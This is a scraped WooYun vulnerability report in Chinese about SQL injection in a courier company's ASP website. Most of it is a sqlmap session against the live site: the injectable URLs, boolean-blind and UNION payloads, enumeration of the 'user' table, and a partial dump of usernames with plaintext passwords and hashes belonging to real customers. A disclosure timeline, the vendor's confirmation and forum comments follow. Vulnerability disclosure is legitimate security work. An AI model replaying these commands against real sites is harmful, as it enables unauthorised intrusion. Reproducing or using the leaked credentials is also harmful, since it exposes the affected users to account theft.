{"id": 38343, "wybug_id": "wooyun-2015-096557", "wybug_title": "亚风速递网站存在SQL注入导致数据库泄露（可明文读取用户密码）", "wybug_corp": "亚风速递", "wybug_author": "麦香浓郁", "wybug_date": "2015-02-12 11:17", "wybug_open_date": "2015-03-29 11:18", "wybug_type": "SQL注射漏洞", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "已交由第三方合作机构(广东省信息安全测评中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-02-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-02-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-02-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-03-06：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-03-16：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-29：\t细节向公众公开  简要描述： 存在SQL注入漏洞，能注入得到数据库信息 详细说明：  注入点1： http://www.airfex.net/cn_asp/prosvr.asp?id=2注入点2：http://www.airfex.net/cn_asp/twzs.asp?id=354等等还有好多..   漏洞证明：  \nC:\\Python27>C:\\Python27\\sqlmap\\sqlmap.pyc -u http://www.airfex.net/cn_asp/hzjm.asp?id=384         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150205}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org---Parameter: id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=384 AND 1053=1053    Type: UNION query    Title: Generic UNION query (NULL) - 4 columns    Payload: id=-4254 UNION ALL SELECT [00:51:57] [INFO] the back-end DBMS is Microsoft Accessweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft AccessC:\\Python27>C:\\Python27\\sqlmap\\sqlmap.pyc -u http://www.airfex.net/cn_asp/hzjm.asp?id=384 --tables         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150205}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[00:54:19] [INFO] resuming back-end DBMS 'microsoft access'[00:54:19] [INFO] testing connection to the target URL[00:54:20] [INFO] heuristics detected web page charset 'ISO-8859-2'sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=384 AND 1053=1053    Type: UNION query    Title: Generic UNION query (NULL) - 4 columns    Payload: id=-4254 UNION ALL SELECT NULL,CHR(113)&CHR(98)&CHR(120)&CHR(120)&CHR(113)&CHR(121)&CHR(99)&CHR(76)&CHR(67)&CHR(88)&CHR(102)&CHR(104)&CHR(117)&CHR(108)&CHR(120)&CHR(113)&CHR(112)&CHR(106)&CHR(98)&CHR(113),NULL,NULL FROM MSysAccessObjects%16---[00:54:20] [INFO] the back-end DBMS is Microsoft Accessweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft Access[00:54:20] [INFO] fetching tables for database: 'Microsoft_Access_masterdb'[00:54:21] [WARNING] the SQL query provided does not return any output[00:54:21] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' [00:54:28] [INFO] starting 10 threads[00:54:30] [INFO] retrieved: user[00:56:42] [INFO] tried 541/3138 items (17%)[00:56:43] [WARNING] connection timed out while trying to get error page information (500)[00:57:10] [INFO] tried 647/3138 items (21%)[00:57:10] [WARNING] connection timed out while trying to get error page information (500)[00:57:10] [INFO] tried 648/3138 items (21%)[00:57:10] [WARNING] connection timed out while trying to get error page information (500)[01:00:33] [INFO] tried 1443/3138 items (46%)[01:00:33] [WARNING] connection timed out while trying to get error page information (500)[01:02:32] [INFO] tried 1918/3138 items (61%)[01:02:32] [WARNING] connection timed out while trying to get error page information (500)[01:03:15] [INFO] tried 2089/3138 items (67%)[01:03:16] [WARNING] connection timed out while trying to get error page information (500)[01:03:50] [INFO] tried 2224/3138 items (71%)[01:03:50] [CRITICAL] connection timed out to the target URL or proxy. sqlmap is going to retry the request[01:03:50] [CRITICAL] connection timed out to the target URL or proxy. sqlmap is going to retry the request[01:03:50] [WARNING] if the problem persists please try to lower the number of used threads (option '--threads')[01:06:44] [INFO] tried 2902/3138 items (92%)[01:06:44] [WARNING] connection timed out while trying to get error page information (500)Database: Microsoft_Access_masterdb[1 table]+------+| user |+------+ [00:51:51] [INFO] testing Microsoft Access[00:51:55] [INFO] confirming Microsoft Access[00:51:57] [INFO] the back-end DBMS is Microsoft Accessweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft AccessC:\\Python27>C:\\Python27\\sqlmap\\sqlmap.pyc -u http://www.airfex.net/cn_asp/hzjm.asp?id=384 -T user --columns         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150205}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[01:09:10] [INFO] resuming back-end DBMS 'microsoft access'[01:09:10] [INFO] testing connection to the target URL[01:09:11] [INFO] heuristics detected web page charset 'ISO-8859-2'sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=384 AND 1053=1053    Type: UNION query    Title: Generic UNION query (NULL) - 4 columns    Payload: id=-4254 UNION ALL SELECT NULL,CHR(113)&CHR(98)&CHR(120)&CHR(120)&CHR(113)&CHR(121)&CHR(99)&CHR(76)&CHR(67)&CHR(88)&CHR(102)&CHR(104)&CHR(117)&CHR(108)&CHR(120)&CHR(113)&CHR(112)&CHR(106)&CHR(98)&CHR(113),NULL,NULL FROM MSysAccessObjects%16---[01:09:11] [INFO] the back-end DBMS is Microsoft Accessweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft Access[01:09:11] [ERROR] cannot retrieve column names, back-end DBMS is Accessdo you want to use common column existence check? [Y/n/q] y[01:09:16] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast'[01:09:16] [INFO] checking column existence using items from 'C:\\Python27\\sqlmap\\txt\\common-columns.txt'[01:09:16] [INFO] adding words used on web page to the check listplease enter number of threads? [Enter for 1 (current)] 20[01:09:20] [CRITICAL] maximum number of used threads is 10 avoiding potential connection issuesplease enter number of threads? [Enter for 1 (current)] 10[01:09:22] [INFO] starting 10 threads[01:09:24] [INFO] retrieved: userid[01:09:24] [INFO] retrieved: id[01:09:25] [INFO] retrieved: username[01:09:27] [INFO] retrieved: email[01:09:42] [INFO] retrieved: data[01:10:08] [INFO] retrieved: password[01:10:12] [INFO] tried 199/2496 items (8%)[01:10:12] [WARNING] connection timed out while trying to get error page information (500)[01:10:31] [INFO] tried 270/2496 items (11%)[01:10:32] [WARNING] connection timed out while trying to get error page information (500)[01:11:31] [INFO] tried 491/2496 items (20%)[01:11:31] [WARNING] connection timed out while trying to get error page information (500)[01:11:44] [INFO] retrieved: logins[01:12:07] [INFO] retrieved: myname[01:12:18] [INFO] retrieved: homepage[01:12:27] [INFO] retrieved: phone [01:20:38] [INFO] tried 2493/2496 items (100%)[01:20:38] [WARNING] connection timed out while trying to get error page information (500)Database: Microsoft_Access_masterdbTable: user[12 columns]+----------+-------------+| Column   | Type        |+----------+-------------+| data     | non-numeric || email    | non-numeric || homepage | non-numeric || id       | numeric     || logins   | numeric     || mobile   | non-numeric || myname   | non-numeric || password | numeric     || phone    | non-numeric || question | non-numeric || userid   | numeric     || username | non-numeric |+----------+-------------+[01:20:50] [WARNING] HTTP error codes detected during run:500 (Internal Server Error) - 2496 times[01:20:50] [INFO] fetched data logged to text files under 'C:\\Documents and Settings\\Administrator\\.sqlmap\\output\\www.airfex.net'C:\\Python27>C:\\Python27\\sqlmap\\sqlmap.pyc -u http://www.airfex.net/cn_asp/prosvr.asp?id=2 -T user -C \"username,password\" --dump         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150205}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] [22:51:47] [INFO] resuming back-end DBMS 'microsoft access'[22:51:47] [INFO] testing connection to the target URL[22:51:48] [INFO] heuristics detected web page charset 'ISO-8859-2'sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=2 AND 5326=5326    Type: UNION query    Title: Generic UNION query (NULL) - 4 columns    Payload: id=-2692 UNION ALL SELECT CHR(113)&CHR(120)&CHR(113)&CHR(113)&CHR(113)&CHR(87)&CHR(65)&CHR(101)&CHR(113)&CHR(81)&CHR(120)&CHR(116)&CHR(118)&CHR(86)&CHR(110)&CHR(113)&CHR(120)&CHR(98)&CHR(107)&CHR(113),NULL,NULL,NULL FROM MSysAccessObjects%16---[22:51:48] [INFO] the back-end DBMS is Microsoft Accessweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft Access[22:51:48] [ERROR] cannot retrieve column names, back-end DBMS is Access[22:51:48] [INFO] fetching entries of column(s) 'password, username' for table 'user' in database 'Microsoft_Access_masterdb'[22:51:49] [INFO] the SQL query used returns 1929 entries[22:56:40] [WARNING] user aborted during enumeration. sqlmap will display partial output[22:56:40] [INFO] fetching number of column(s) 'password, username' entries fortable 'user' in database 'Microsoft_Access_masterdb'[22:56:40] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[22:56:40] [INFO] retrieved: 1929[22:57:44] [INFO] fetching number of distinct values for column 'password'[22:57:44] [INFO] retrieved: 1581[22:58:04] [INFO] fetching number of distinct values for column 'username'[22:58:04] [INFO] retrieved: 1929[22:58:37] [INFO] using column 'username' as a pivot for retrieving row data[22:58:37] [INFO] retrieved: 00001[22:59:39] [INFO] retrieved: 49ba59abbe56e057[23:01:47] [INFO] retrieved:[23:02:19] [WARNING] connection timed out while trying to get error page information (500)000056[23:03:02] [INFO] retrieved: 123456[23:03:41] [INFO] retrieved: 00[23:04:25] [CRITICAL] connection timed out to the target URL or proxy. sqlmap is going to retry the request006[23:04:42] [INFO] retrieved: 555666[23:05:35] [INFO] retrieved: 00010[23:06:31] [INFO] retrieved: 800800[23:07:22] [INFO] retrieved: 00012[23:07:47] [INFO] retrieved: 123456[23:08:27] [INFO] retrieved: 00013[23:09:02] [INFO] retrieved: 123456[23:10:11] [INFO] retrieved: 000147[23:11:04] [INFO] retrieved: 6[23:11:41] [WARNING] connection timed out while trying to get error page information (500)ae[23:12:20] [CRITICAL] unable to connect to the target URL or proxy. sqlmap is going to retry the requestc2d257a[23:13:53] [CRITICAL] unable to connect to the target URL or proxy. sqlmap is going to retry the request133aa9[23:15:31] [INFO] retrieved: 00016[23:15:58] [INFO] retrieved: 989900[23:16:55] [INFO] retrieved: 00018[23:17:33] [INFO] retrieved: 11[23:17:54] [INFO] retrieved: 00031[23:18:54] [INFO] retrieved: 123456[23:20:07] [INFO] retrieved: 0[23:20:45] [WARNING] connection timed out while trying to get error page information (500)0044[23:21:06] [INFO] retrieved: 123123[23:21:36] [INFO] retrieved: 00056[23:22:06] [INFO] retrieved: 123456[23:22:56] [INFO] retrieved: 00090[23:23:32] [INFO] retrieved:[23:24:11] [CRITICAL] connection timed out to the target URL or proxy. sqlmap is going to retry the request760924[23:24:58] [INFO] retrieved: 00117[23:25:48] [INFO] retrieved: 1[23:26:23] [CRITICAL] unable to connect to the target URL or proxy. sqlmap is going to retry the request23456[23:27:34] [INFO] retrieved: 00123[23:28:39] [INFO] retrieved: 901200[23:29:33] [INFO] retrieved: 00156[23:30:08] [INFO] retrieved: 18676910588[23:31:44] [INFO] retrieved: 00170[23:32:44] [INFO] retrieved: longli[23:33:31] [INFO] retrieved: 00172[23:34:15] [INFO] retrieved: 71890[23:35:16] [CRITICAL] connection timed out to the target URL or proxy. sqlmap is going to retry the request0[23:35:28] [INFO] retrieved:[23:36:02] [CRITICAL] connection timed out to the target URL or proxy. sqlmap is going to retry the request00179[23:37:07] [INFO] retrieved: ba00179[23:38:29] [INFO] retrieved: 0021[23:39:22] [INFO] retrieved: 123456[23:40:14] [INFO] retrieved: 00365[23:40:44] [INFO] retrieved: airf[23:41:34] [WARNING] connection timed out while trying to get error page information (500)ex[23:41:43] [INFO] retrieved: 00425[23:42:37] [INFO] retrieved: 4[23:43:15] [CRITICAL] connection timed out to the target URL or proxy. sqlmap is going to retry the request25509[23:43:53] [INFO] retrieved:[23:44:29] [CRITICAL] connection timed out to the target URL or proxy. sqlmap is going to retry the request00468[23:45:32] [INFO] retrieved: 5[23:46:32] [WARNING] connection timed out while trying to get error page information (500)19116[23:47:02] [INFO] retrieved: 005100[23:47:33] [INFO] retrieved: bbfd05369be83eb9[23:48:53] [INFO] retrieved: 005219[23:49:33] [INFO] retrieved: 203bec946ed8f2b3[23:52:13] [INFO] retrieved: 00521901[23:53:58] [INFO] retrieved: 203bec946ed8f2b3[23:55:42] [INFO] retrieved: 00523[23:56:22] [INFO] retrieved: 4631159[23:56:59] [INFO] retrieved: 005609[23:58:16] [WARNING] connection timed out while trying to get error page information (500)9[23:58:35] [INFO] retrieved: 220950[23:59:24] [INFO] retrieved: 00610[23:59:51] [INFO] retrieved: 19810621[00:00:51] [INFO] retrieved: 00624[00:01:37] [INFO] retrieved: book[00:02:28] [INFO] retrieved: 00683[00:03:22] [INFO] retrieved: 19840903[00:04:49] [INFO] retrieved: 00810[00:06:19] [INFO] retrieved: 293860516ed66c4d[00:07:56] [INFO] retrieved: 01000[00:09:01] [INFO] retrieved: 201101[00:09:40] [INFO] retrieved: 01003[00:10:10] [INFO] retrieved: ping5201314[00:11:26] [INFO] retrieved: 01052[00:11:53] [INFO] retrieved: 545900[00:12:38] [INFO] retrieved: 01073[00:13:05] [INFO] retrieved: 123456[00:13:35] [INFO] retrieved: 01[00:14:20] [WARNING] connection timed out while trying to get error page information (500)10[00:15:04] [WARNING] connection timed out while trying to get error page information (500)2[00:15:19] [INFO] retrieved: 1111[00:16:48] [WARNING] connection timed out while trying to get error page information (500)11[00:17:14] [INFO] retrieved: 01119553[00:18:05] [INFO] retrieved: 123456[00:18:53] [INFO] retrieved: 011307[00:20:04] [INFO] retrieved: 198351[00:21:26] [WARNING] connection timed out while trying to get error page information (500)7[00:21:45] [INFO] retrieved: 01158[00:22:22] [INFO] retrieved: 886614520[00:23:36] [CRITICAL] connection timed out to the target URL or proxy. sqlmap is going to retry the request[00:23:42] [INFO] retrieved: 01164[00:24:21] [INFO] retrieved: luojia[00:25:28] [INFO] retrieved: 01448[00:26:28] [INFO] retrieved: abbf9a2c40f591ca[00:28:01] [INFO] retrieved: 01498[00:28:40] [INFO] retrieved: 000000[00:29:47] [INFO] retrieved: 01546[00:30:19] [INFO] retrieved: 123456[00:30:50] [INFO] retrieved: 01608[00:31:26] [INFO] retrieved: 123456[00:32:12] [INFO] retrieved: 0[00:32:54] [WARNING] connection timed out while trying to get error page information (500)1673[00:33:49] [INFO] retrieved: 19871202[00:35:41] [INFO] retrieved: 01836[00:36:51] [INFO] retrieved: 123\n   修复方案：  过滤一些字符……预编译……等等 我就是渣渣 你们都会的..   版权声明：转载请注明来源 麦香浓郁@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-02-14 13:06 厂商回复： 非常感谢您的报告。报告中的问题已确认并复现.影响的数据：中攻击成本：低造成影响：中综合评级为：中，rank：10正在联系相关网站管理单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-02-26 09:59 |    \t\t承诺 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:2        | 你关注的漏洞 发表了白帽子)\t\t \n  麦香浓郁 JJ    \n     2015-03-12 21:34 |    \t\t麦香浓郁 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 前排膜拜乌云ph m锅 凤凰 a11 dot 各种师傅)\t\t \n  @承诺 承诺牛带我     \n     2015-09-11 09:55 |    \t\t残废 \t\t\t( 普通白帽子  |\t\t\t        Rank:179 漏洞数:40        | 我是残废，啦啦啦啦)\t\t \n  师傅好牛逼    \n     2015-09-14 22:11 |    \t\t麦香浓郁 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 前排膜拜乌云ph m锅 凤凰 a11 dot 各种师傅)\t\t \n  @残废 我日  抢红包手本给我    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}